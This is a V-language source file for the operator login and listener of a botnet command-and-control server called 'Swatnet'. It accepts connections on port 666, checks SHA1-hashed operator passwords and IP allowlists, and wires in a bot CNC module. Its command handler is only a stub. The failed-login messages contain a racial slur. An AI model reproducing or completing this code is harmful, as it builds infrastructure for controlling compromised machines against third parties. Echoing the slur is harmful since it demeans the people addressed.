module cnc

import io
import net
import time
import crypto.sha1

import cnc
import core.crud

pub struct Swatnet {
	pub mut:
		port		int = 666
		bot_port	int
		bot_pw		string
		clients 	Clients
		user_crud	crud.User
		bot			cnc.Bot_CNC
}

pub struct Clients {
	pub mut:
		name		[]string
		socket		[]net.TcpConn
}

pub fn start_swatnet() Swatnet {
	mut s := Swatnet{clients: &Clients{}, user_crud: &crud.User{}, bot: cnc.start_botcnc()}
	return s
}

pub fn start(mut s Swatnet) {
	s.listener()
}

pub fn (mut s Swatnet) listener() {
	mut socket := net.listen_tcp(.ip6, ":${s.port}") or {
		println("[x] Error, Unable to start Swatnet....!")
		exit(0)
	}
	for {
		mut client := socket.accept() or {
			println("[x] Error, Unable to accept client.....!")
			return
		}
		client.set_read_timeout(time.infinite)
		go s.auth(mut client)
	}
}

pub fn (mut s Swatnet) auth(mut client net.TcpConn) {
	mut reader := io.new_buffered_reader(reader: client)
	mut crud := crud.User{}
	user_addy := client.peer_addr() or { return }
	user_ip := "${user_addy}".split("]:")[0].replace("[::ffff:", "")

	client.write_string("Username: ") or { 0 }
	username := reader.read_line() or { "" }
	client.write_string("Password: ") or { 0 }
	password := reader.read_line() or { "" }

	user_info := crud.find(username)

	if user_info.username == username && user_info.password == (sha1.sum(password.bytes()).hex()).str() {
		if user_info.ip == user_ip || user_info.ip == "1.1.1.1" {
			client.write_string("[ + ] Access Granted\r\nWelcome: ${username}\r\n") or { 0 }
		} else {
			client.write_string("[ x ] Access Denied (IP)\r\nDuces Nigga....") or { 0 }
			time.sleep(5*time.second)
			client.close() or { return }
		}
	} else {
		client.write_string("[ x ] Access Denied (Password)\r\nDuces Nigga....") or { 0 }
		time.sleep(5*time.second)
		client.close() or { return }
	}
	s.handler(mut client)
}

pub fn (mut s Swatnet) handler(mut client net.TcpConn) {
	mut reader := io.new_buffered_reader(reader: client)
	for {
		client.write_string(">>> ") or { 0 }
		data := reader.read_line() or { "" }
		if data.len > 5 {
			match data {
				"help" {
					client.write_string("Working\r\n") or { 0 }
				} else {}
			}
		}
	}
}